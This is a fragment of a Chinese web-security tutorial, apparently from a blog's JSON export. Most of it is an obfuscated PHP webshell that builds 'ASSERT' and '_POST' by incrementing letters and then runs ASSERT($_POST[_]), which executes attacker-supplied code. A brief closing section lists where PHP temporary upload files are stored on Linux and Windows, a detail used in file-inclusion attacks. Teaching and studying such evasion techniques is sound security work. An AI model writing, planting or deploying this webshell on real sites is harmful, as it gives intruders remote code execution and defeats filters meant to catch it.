//$_=&quot;A&quot;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;S&quot;，此时$__=&quot;S&quot;$___ .= $__;   //$___=&quot;AS&quot;$___ .= $__;   //$___=&quot;ASS&quot;$__ = $_;   //$__=&quot;A&quot;$__++;$__++;$__++;$__++;   //得到&quot;E&quot;，此时$__=&quot;E&quot;$___ .= $__;   //$___=&quot;ASSE&quot;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到&quot;R&quot;，此时$__=&quot;R&quot;$___ .= $__;   //$___=&quot;ASSER&quot;$__++;$__++;   //得到&quot;T&quot;，此时$__=&quot;T&quot;$___ .= $__;   //$___=&quot;ASSERT&quot;$__ = $_;   //$__=&quot;A&quot;$____ = &quot;_&quot;;   //$____=&quot;_&quot;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;P&quot;，此时$__=&quot;P&quot;$____ .= $__;   //$____=&quot;_P&quot;$__ = $_;   //$__=&quot;A&quot;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;O&quot;，此时$__=&quot;O&quot;$____ .= $__;   //$____=&quot;_PO&quot;$__++;$__++;$__++;$__++;   //得到&quot;S&quot;，此时$__=&quot;S&quot;$____ .= $__;   //$____=&quot;_POS&quot;$__++;   //得到&quot;T&quot;，此时$__=&quot;T&quot;$____ .= $__;   //$____=&quot;_POST&quot;$_ = $$____;   //$_=$_POST$___($_[_]);   //ASSERT($POST[_])\n\n临时文件\n临时文件目录：\nLinux临时文件主要存储在/tmp/目录下，格式通常是（/tmp/php[6个随机字符]）\nWindows临时文件主要存储在C:/Windows/目录下，格式通常是（C:/Windows/php[4个随机字符].tmp）\n\n\n\n","categories":["网络安全"],"tags":["web安全"]}]